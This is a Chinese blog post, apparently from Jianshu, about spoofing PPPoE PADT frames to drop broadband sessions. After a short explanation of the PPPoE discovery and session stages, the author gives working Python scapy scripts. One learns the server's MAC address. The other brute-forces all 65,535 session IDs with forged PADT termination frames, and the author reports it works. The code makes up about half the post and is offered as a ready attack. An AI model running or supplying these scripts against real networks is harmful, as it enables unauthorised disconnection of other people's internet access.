@@ -1,0 +1,80 @@
+logo精彩文章免费看
+PPPoE攻击：PADT断开连接
+
+语文小子
+
+简书作者
+0.2442016-11-04 14:39
+PPPoE协议是一个非常良好的协议，它具有带宽控制、用户认证、防ARP病毒等功能，基本上可以满足网络人员对用户的管理，多用于adsl拨号，许多运行商就是通过pppoe拨号对用户实现宽带接入
+
+本人在使用PPPoE协议过程中，对PPPoE协议进行了学习，发现PPPoE有一些不足，研究如下
+
+PPPoE认证分为两个阶段：
+
+第一阶段：发现阶段
+
+pppoe client广播发送PADI数据包建立连接
+pppoe server回复一个PADO单播帧
+client回复一个PADR单播请求，期望进行会话
+pppoe server回复一个PADS数据包，同意进行下一步协商（包中携带一个sessionid，作为用户的凭证之一）
+第二阶断：会话阶段
+双方使用PPP的LCP协议协商链路，NCP进行用户名密码检验，双方完成通讯
+
+在第一阶段pppoe会话重要依据就是双方的mac地址，在和sessionid
+
+在用户下线的时候，用户会发送PADT数据包进行协商，断开会话连接
+
+那么问题来了：如果我们冒充服务器(客户)，向客户(服务器)发送伪造的特定格式的PADT数据包，会不会断开会话？基于这一思路，我利用python的scapy模块写出了一个程序，经过测试，这个思路完全正确，可以达到断开会话的目的
+
+攻击的原理：在pppoe client发送广播帧发送discovery时,监听网络，得到client mac地址，再对client发送一个PADT数据包，包中包含sessionid，这时就可以使client误以为server结束了连接。注意：在发送病毒帧时，双方应该已经完成了第一阶段的会话
+
+由于我们不清楚客户获得的sessionid，所以对于sessionid的取值直接使用了数据字典，因此为了破坏连接必须发送65535个数据包，所需时间较长
+
+攻击的python代码如下：
+
+这段代码可以获得PPPoE服务器的mac地址
+from scapy.all  import *
+from struct import *
+import threading
+
+def packet(code=0x09,len=12,macadd='ff:ff:ff:ff:ff:ff'):
+    a=Ether()/PPPoE()/Raw()
+    a.dst=macadd
+    a.type=0x8863
+    a.payload.version=1
+    a.payload.type=1
+    a.payload.code=code
+    a.payload.len=len
+    a.payload.payload.load=pack("12B",0x01,0x01,0,0,0x01,0x03,0,0x04,0x25,0x1d,0,0)
+    return a
+
+def sniffPPPoE():
+    c=sniff(filter='pppoed',count=2)
+    c[1].show()
+
+t = threading.Thread(target=sniffPPPoE)
+
+if __name__ == '__main__':
+    t.start()
+    time.sleep(1)
+    sendp(packet(code=0x09))
+这段代码可以断开连接，src地址需修改，为服务器mac地址，可由上面程序获得
+rom  scapy.all import *
+
+a=sniff(filter='pppoed',count=1)
+time.sleep(3)
+for i in range(65535):
+    c=Ether()/PPPoE()
+    c.dst=a[0].src
+    c.src="00:0c:29:1e:c1:3a"
+    c.type=0x8863
+    c.payload.code=0xa7
+    c.payload.sessionid=i
+    c.payload.len=0
+    sendp(c)
+    print "send session:"+str(i)
+© 著作权归作者所有,转载或内容合作请联系作者
+
+创作你的创作，
+接受世界的赞赏
+||热门文章
